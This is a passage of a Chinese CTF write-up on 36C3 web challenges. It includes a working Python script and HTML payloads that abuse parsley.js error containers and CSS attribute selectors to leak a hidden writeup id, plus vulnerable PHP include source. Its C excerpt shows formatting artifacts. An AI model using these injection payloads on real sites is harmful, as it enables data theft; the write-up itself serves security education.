&#x6240;&#x505A;&#x7684;&#x52A8;&#x4F5C;&#x6709;&#x4E24;&#x4E2A;&#xFF0C;&#x4E00;&#x4E2A;&#x5C31;&#x662F;&#x767B;&#x5F55;&#xFF0C;&#x6839;&#x636E;&#x9898;&#x76EE;&#x4FE1;&#x606F;&#xFF0C;&#x6211;&#x4EEC;&#x57FA;&#x672C;&#x4E0A;&#x5BF9;&#x8FD9;&#x4E2A;&#x64CD;&#x4F5C;&#x6CA1;&#x529E;&#x6CD5;&#x8FDB;&#x884C;&#x4EC0;&#x4E48;&#x5E72;&#x6270;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x5C31;&#x662F;&#x70B9;&#x8D5E;&#x4E86;&#xFF0C;&#x66F4;&#x5177;&#x4F53;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x901A;&#x8FC7; show.php &#x6253;&#x5F00;&#x4F60;&#x7684; writeup &#x5185;&#x5BB9;&#xFF0C;&#x5E76;&#x4E14;&#x70B9;&#x51FB;&#x9875;&#x9762;&#x4E0A; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x66F4;&#x53EF;&#x80FD;&#x7684;&#x4E8B;&#x5BF9;&#x70B9;&#x8D5E;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x5E72;&#x6270;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x4E14;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x6D4B;&#x8BD5;&#xFF0C;&#x901A;&#x8FC7; <code>selenium.webdriver</code>&#x8C03;&#x7528;<code>find_element_by_xpath</code>&#x51FD;&#x6570;&#x5F97;&#x5230;&#x7684; id &#x4E3A; like &#x7684; input &#x5143;&#x7D20;&#x53EA;&#x80FD;&#x6709;&#x7B2C;&#x4E00;&#x4E2A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5373;&#x4F7F;&#x6211;&#x4EEC;&#x5728; writeup &#x5185;&#x5BB9;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x4E2A; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;admin &#x4E5F;&#x53EA;&#x4F1A;&#x6839;&#x636E;&#x9875;&#x9762;&#x987A;&#x5E8F;&#x62FF;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;&#x70B9;&#x8D5E; input &#x3002;</p><p>&#x5E76;&#x4E14; CSP &#x4E5F;&#x9650;&#x5236;&#x5F97;&#x5F88;&#x4E25;&#x683C;&#xFF0C;&#x4F3C;&#x4E4E;&#x9677;&#x5165;&#x4E86;&#x50F5;&#x5C40;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x6709;&#x4EE5;&#x4E0A; parsley.js &#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x6765;&#x6784;&#x9020;&#x4E00;&#x4E9B; Payload &#x3002;</p><p>&#x9996;&#x5148;&#xFF0C;&#x56E0;&#x4E3A;<code>find_element_by_xpath</code>&#x53EA;&#x4F1A;&#x5F97;&#x5230;&#x7B2C;&#x4E00;&#x4E2A; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x901A;&#x8FC7; parsley.js &#x53EF;&#x4EE5;&#x5C06;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x8F93;&#x51FA;&#x5230;&#x6307;&#x5B9A;&#x9875;&#x9762;&#x4F4D;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5927;&#x6982;&#x53EF;&#x4EE5;&#x6709;&#x4E00;&#x4E2A;&#x60F3;&#x6CD5;&#xFF0C;&#x628A;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x7528;&#x7684;&#x5355;&#x72EC;&#x7684; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#x63D2;&#x5165;&#x5230;&#x539F;&#x6765;&#x7684;&#x70B9;&#x8D5E;&#x6309;&#x94AE;&#x4E4B;&#x524D;&#x3002;</p><p>&#x4F46;&#x662F;&#x8FD9;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x518D;&#x6765;&#x4ED4;&#x7EC6;&#x770B;&#x770B; admin &#x8981;&#x70B9;&#x8D5E;&#x7684;&#x90A3;&#x4E2A;&#x9875;&#x9762;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png" alt></p><p>&#x9875;&#x9762;&#x4E0A;&#x90E8;&#x5206;&#x662F; header.php &#xFF0C;&#x4F1A;&#x5C55;&#x793A;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6240;&#x63D0;&#x4EA4;&#x7684; writeup &#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4; admin &#x7684;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x4E5F;&#x662F;&#x552F;&#x4E00;&#x4E00;&#x4E2A; a &#x6807;&#x7B7E;&#x5C31;&#x662F; flag &#x7684;&#x5730;&#x5740;&#xFF0C;&#x73B0;&#x5728;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x53D8;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x600E;&#x4E48;&#x83B7;&#x53D6;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x7684;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#x6765;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x5982;&#x4F55;&#x83B7;&#x53D6;&#x8FD9;&#x4E2A; a &#x6807;&#x7B7E;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x6216;&#x8005;&#x66F4;&#x786E;&#x5207;&#x7684;&#x8BF4;&#x5C31;&#x662F;&#x83B7;&#x53D6; writeup id &#x7684;&#x4E8B;&#x60C5;&#x4E86;&#x3002;</p><h3 id="CSS-Selector"><a href="#CSS-Selector" class="headerlink" title="CSS Selector"></a>CSS Selector</h3><p>&#x5982;&#x4F55;&#x83B7;&#x53D6; a &#x6807;&#x7B7E;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#x8C8C;&#x4F3C;&#x4E5F;&#x5C31;&#x8DDF;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x63D0;&#x5230;&#x7684;<code>data-parsley-errors-container</code> API &#x6709;&#x5173;&#x4E86;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A; API &#x53C8;&#x652F;&#x6301; CSS &#x9009;&#x62E9;&#x5668;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x662F;&#x4E0D;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; CSS &#x9009;&#x62E9;&#x5668;&#x6765;&#x8BA9;&#x6211;&#x4EEC;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x653E;&#x5230;&#x8FD9;&#x4E2A; a &#x6807;&#x7B7E;&#x4E4B;&#x540E;&#x5462;&#xFF0C;&#x8FD9;&#x6837;&#x4EE5;&#x6765;&#x4E5F;&#x5C31;&#x76F4;&#x63A5;&#x5C31;&#x653E;&#x5230;&#x4E86;&#x70B9;&#x8D5E;&#x6309;&#x94AE;&#x4E4B;&#x524D;&#x4E86;&#x3002;</p><p>&#x7C7B;&#x4F3C;&#x4E4B;&#x524D; XCTF Final &#x4E00;&#x4E2A; CSS &#x4FA7;&#x4FE1;&#x9053;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528;<code>a[href^=&apos;/show.php?id={flag}]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x5143;&#x7D20;&#x9009;&#x62E9;&#x3002;</p><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; flag &#x503C;&#x4E0E;&#x9875;&#x9762;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#x4E5F;&#x5C31;&#x662F; writeup id &#x524D;&#x90E8;&#x5206;&#x5B8C;&#x5168;&#x5339;&#x914D;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x628A;&#x4E00;&#x4E2A;&#x65E0;&#x6548;&#x7684; id=like input &#x6807;&#x7B7E;&#x63D2;&#x5165;&#x5230;&#x8BE5; a &#x6807;&#x7B7E;&#x4E4B;&#x540E;&#xFF0C;&#x4EA6;&#x5373;&#x771F;&#x6B63;&#x7528;&#x4E8E;&#x63D0;&#x4EA4; like &#x8BF7;&#x6C42;&#x7684; input &#x6807;&#x7B7E;&#x4E4B;&#x524D;&#xFF1B;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; flag &#x503C;&#x4E0E;&#x9875;&#x9762;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#x4E5F;&#x5C31;&#x662F; writeup id &#x524D;&#x90E8;&#x5206;&#x4E0D;&#x5B8C;&#x5168;&#x5339;&#x914D;&#x7684;&#xFF0C;parsley.js &#x4EC0;&#x4E48;&#x4E5F;&#x4E0D;&#x4F1A;&#x505A;&#xFF0C;admin &#x4F1A;&#x6B63;&#x5E38;&#x5730;&#x70B9;&#x8D5E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x5730;&#x5728;&#x81EA;&#x5DF1;&#x7684; writeup &#x9875;&#x9762;&#x770B;&#x5230; admin &#x7684;&#x70B9;&#x8D5E;&#x3002;</p><p>&#x6240;&#x4EE5;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DEE;&#x5F02;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x4FA7;&#x4FE1;&#x9053;&#x653B;&#x51FB;&#x83B7;&#x53D6; flag &#x7684; writeup id&#x3002;</p><p>&#x811A;&#x672C;&#x7F16;&#x5199;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF1A;</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="hljs-string">&quot;http://ip:8001/&quot;</span></span><br><span class="line"></span><br><span class="line">res = s.get(base_url)</span><br><span class="line"></span><br><span class="line">pos = res.text.find(<span class="hljs-string">&apos;name=&quot;c&quot; value=&quot;&apos;</span>) + len(<span class="hljs-string">&apos;name=&quot;c&quot; value=&quot;&apos;</span>)</span><br><span class="line">csrftoken = res.text[pos:pos+<span class="hljs-number">16</span>]</span><br><span class="line"></span><br><span class="line">ss = <span class="hljs-string">&quot;1234567890abcdef&quot;</span></span><br><span class="line">flag = <span class="hljs-string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> ss:</span><br><span class="line">        payload = <span class="hljs-string">f&quot;&lt;form data-parsley-validate&gt;&lt;input data-parsley-required data-parsley-trigger=\&quot;blur\&quot; data-parsley-error-message=&apos;&lt;input type=\&quot;input\&quot; id=like value=\&quot;rebirth_is_really_nb\&quot;&gt;&apos; data-parsley-errors-container=\&quot;a[href^=&apos;/show.php?id=<span class="hljs-subst">{flag + j}</span>&apos;]\&quot; autofocus&gt;&lt;/form&gt;&quot;</span></span><br><span class="line">        data = {<span class="hljs-string">&apos;c&apos;</span>: csrftoken, <span class="hljs-string">&apos;content&apos;</span>: payload}</span><br><span class="line">        res = s.post(base_url + <span class="hljs-string">&quot;add.php&quot;</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)</span><br><span class="line">        <span class="hljs-comment"># print(res.headers)</span></span><br><span class="line">        location = res.headers[<span class="hljs-string">&apos;Location&apos;</span>]</span><br><span class="line">        pos = location.find(<span class="hljs-string">&apos;id=&apos;</span>) + <span class="hljs-number">3</span></span><br><span class="line">        wp = location[pos:]</span><br><span class="line">        data = {<span class="hljs-string">&apos;c&apos;</span>: csrftoken, <span class="hljs-string">&apos;id&apos;</span>: wp}</span><br><span class="line">        res = s.post(base_url + <span class="hljs-string">&quot;admin.php&quot;</span>, data=data)</span><br><span class="line">        time.sleep(<span class="hljs-number">3</span>)</span><br><span class="line"></span><br><span class="line">        res = s.get(<span class="hljs-string">f&quot;http://ip:8001/show.php?id=<span class="hljs-subst">{wp}</span>&quot;</span>)</span><br><span class="line">        <span class="hljs-comment"># print(res.text)</span></span><br><span class="line">        txt = res.text.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Liked by&lt;/h3&gt;admin&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> txt:</span><br><span class="line">            flag += j</span><br><span class="line">            print(i,flag)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br></pre></td></tr></table></figure><p>&#x62FF;&#x5230; writeup id &#x4E4B;&#x540E;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5373;&#x53EF;&#xFF1A;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png" alt></p><h3 id="Other-Selector"><a href="#Other-Selector" class="headerlink" title="Other Selector"></a>Other Selector</h3><p>&#x5F53;&#x7136;&#x8BE5;&#x9875;&#x9762;&#x4E0D;&#x4EC5;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; a &#x6807;&#x7B7E;&#x7684; href &#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x83B7;&#x53D6; writeup id&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5B83; value &#x503C;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;like&quot;</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">&quot;blur&quot;</span> <span class="hljs-attr">autofocus</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;some-field&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">&quot;&lt;input id=like type=button&gt;&quot;</span> <span class="hljs-attr">data-parsley-required</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">&quot;a:contains(&apos;Writeup - 5&apos;):eq(0)&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x6216;&#x8005;&#x4F7F;&#x7528;<code>data-parsley-equalto</code> API &#x8FDB;&#x884C;&#x5224;&#x65AD;&#x5C5E;&#x6027;&#x503C;&#xFF1A;</p><blockquote><p><strong>data-parsley-equalto=&#x201D;#anotherfield&#x201D;</strong></p><p>Validates that the value is identical to another field&#x2019;s value (useful for password confirmation check).</p></blockquote><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">&quot;focusout&quot;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-equalto</span>=<span class="hljs-string">&apos;a[href^=&quot;/show.php?id=GUESS&quot;]&apos;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">&quot;form[action=&apos;/like.php&apos;]&quot;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">&apos;&lt;input type=&quot;input&quot; name=&quot;id&quot; value=&quot;0000000000000000&quot;&gt;&apos;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">value</span>=<span class="hljs-string">&apos;a[href^=&quot;/show.php?id=GUESS&quot;]&apos;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Includer"><a href="#Includer" class="headerlink" title="Includer"></a>Includer</h2><blockquote><p><strong>Difficulty estimate</strong>: medium</p><p><strong>Solved</strong>:9/321</p><p><strong>Points</strong>: round(1000 &#xB7; min(1, 10 / (9 + [9 solves]))) = <strong>556</strong> points</p><p><strong>Description:</strong></p><p>Just sitting here and waiting for PHP 8.0 (lolphp).</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/includer/includer-df39401c4c1c28ab.tar.xz" target="_blank" rel="noopener">includer-df39401c4c1c28ab.tar.xz (3.5 KiB)</a></p></blockquote><p>&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x6E90;&#x4EE3;&#x7801;&#x4EE5;&#x53CA;&#x90E8;&#x7F72;&#x6587;&#x4EF6;&#xFF0C;&#x6E90;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line">$rand_dir = <span class="hljs-string">&apos;files/&apos;</span>.bin2hex(random_bytes(<span class="hljs-number">32</span>));</span><br><span class="line">mkdir($rand_dir) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;mkdir&apos;</span>);</span><br><span class="line">putenv(<span class="hljs-string">&apos;TMPDIR=&apos;</span>.<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&apos;/&apos;</span>.$rand_dir) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;putenv&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;Hello &apos;</span>.$_POST[<span class="hljs-string">&apos;name&apos;</span>].<span class="hljs-string">&apos; your sandbox: &apos;</span>.$rand_dir.<span class="hljs-string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">try</span> {</span><br><span class="line">    <span class="hljs-keyword">if</span> (stripos(file_get_contents($_POST[<span class="hljs-string">&apos;file&apos;</span>]), <span class="hljs-string">&apos;&lt;?&apos;</span>) === <span class="hljs-keyword">false</span>) {</span><br><span class="line">        <span class="hljs-keyword">include_once</span>($_POST[<span class="hljs-string">&apos;file&apos;</span>]);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">finally</span> {</span><br><span class="line">    system(<span class="hljs-string">&apos;rm -rf &apos;</span>.escapeshellarg($rand_dir));</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="Configuration-Error"><a href="#Configuration-Error" class="headerlink" title="Configuration Error"></a>Configuration Error</h3><p>&#x5176;&#x4E2D;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6709;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#x7684;&#x914D;&#x7F6E;&#x9519;&#x8BEF;&#xFF1A;</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /.well-known {</span><br><span class="line">  autoindex on;</span><br><span class="line">  alias /var/www/html/well-known/;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>&#x5F00;&#x542F;&#x4E86;&#x5217;&#x76EE;&#x5F55;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x904D;&#x5386;&#x5230;&#x4E0A;&#x5C42;&#x6587;&#x4EF6;&#x5939;&#x3002;</p><h3 id="Upload-Arbitrary-Data"><a href="#Upload-Arbitrary-Data" class="headerlink" title="Upload Arbitrary Data"></a>Upload Arbitrary Data</h3><p>&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x6CA1;&#x6709;<code>&lt;?</code>&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x6211;&#x60F3;&#x5230;&#x7684;&#x662F;p&#x725B;&#x535A;&#x5BA2;&#x91CC;&#x9762;&#x6709;&#x5173;&#x6B7B;&#x4EA1; exit &#x7684;&#x5185;&#x5BB9;&#xFF0C;<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">&#x8C08;&#x4E00;&#x8C08;php://filter&#x7684;&#x5999;&#x7528;</a>&#xFF0C;&#x5948;&#x4F55;&#x539F;&#x6587;&#x7528;&#x7684;&#x662F;<code>file_put_content</code>&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x7528;&#x7684;&#x662F;<code>file_get_contents</code>&#xFF0C;&#x5E76;&#x4E14;&#x8FD9;&#x91CC;&#x7684;&#x5224;&#x65AD;&#x4E5F;&#x5728;&#x4F7F;&#x7528;&#x4E86;<code>file_get_contents</code>&#x51FD;&#x6570;&#x4E4B;&#x540E;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6709;<code>&lt;?</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;&#x7F16;&#x7801;&#x7ED5;&#x8FC7;&#x5C31;&#x4E0D;&#x592A;&#x53EF;&#x80FD;&#x4E86;&#x3002;</p><p>&#x800C;&#x4E14;&#x8FD9;&#x91CC;&#x6700;&#x5947;&#x602A;&#x7684;&#x5C31;&#x662F;&#x4E4B;&#x524D;&#x7528;&#x4E86;&#x4E00;&#x4E9B;&#x770B;&#x4F3C;&#x65E0;&#x5173;&#x7D27;&#x8981;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6BD4;&#x5982;&#x4F7F;&#x7528;&#x4E86;<code>putenv()</code>&#x51FD;&#x6570;&#x7B49;&#xFF0C;&#x7ED9;&#x4E86;&#x6211;&#x4EEC;&#x4E00;&#x4E2A; sandbox &#xFF0C;&#x7136;&#x800C;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x8868;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5565;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p><p>balsn &#x961F;&#x4F0D;&#x5728;&#x516C;&#x5F00;&#x7684; wp &#x4E2D;&#x5199;&#x4E86;&#x6BD4;&#x8F83;&#x8BE6;&#x7EC6;&#x7684;&#x6E90;&#x7801;&#x5206;&#x6790;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x5C31;&#x914D;&#x5408;&#x5176;&#x4E2D;&#x7684; wp &#x8FDB;&#x884C;&#x4E00;&#x4E0B;&#x7B80;&#x5355;&#x7684;&#x5206;&#x6790;&#x3002;</p><p>&#x9996;&#x5148;&#x76F4;&#x63A5;&#x7ED9;&#x51FA;&#x7ED3;&#x8BBA;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>compress.zip://</code>&#x6D41;&#x8FDB;&#x884C;&#x4E0A;&#x4F20;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#xFF0C;&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x76F8;&#x5173;&#x539F;&#x7406;&#x3002;</p><p>&#x5728; <a href="https://github.com/php/php-src" target="_blank" rel="noopener">php-src</a> &#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x8BE5;&#x6D41;&#x7684;&#x76F8;&#x5173;&#x89E6;&#x53D1;&#x89E3;&#x6790;&#x51FD;&#x6570;<code>php_stream_gzopen</code></p><p>ext/zlib/zlib_fopen_wrapper.c</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">php_stream *<span class="hljs-title">php_stream_gzopen</span><span class="hljs-params">(php_stream_wrapper *wrapper, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> options,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  zend_string **opened_path, php_stream_context *context STREAMS_DC)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">true...</span><br><span class="line">true<span class="hljs-keyword">if</span> (strncasecmp(<span class="hljs-string">&quot;compress.zlib://&quot;</span>, path, <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>) {</span><br><span class="line">truetruepath += <span class="hljs-number">16</span>;</span><br><span class="line">true} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strncasecmp(<span class="hljs-string">&quot;zlib:&quot;</span>, path, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {</span><br><span class="line">truetruepath += <span class="hljs-number">5</span>;</span><br><span class="line">true}</span><br><span class="line"></span><br><span class="line">trueinnerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context);</span><br><span class="line">true...</span><br><span class="line">true<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span 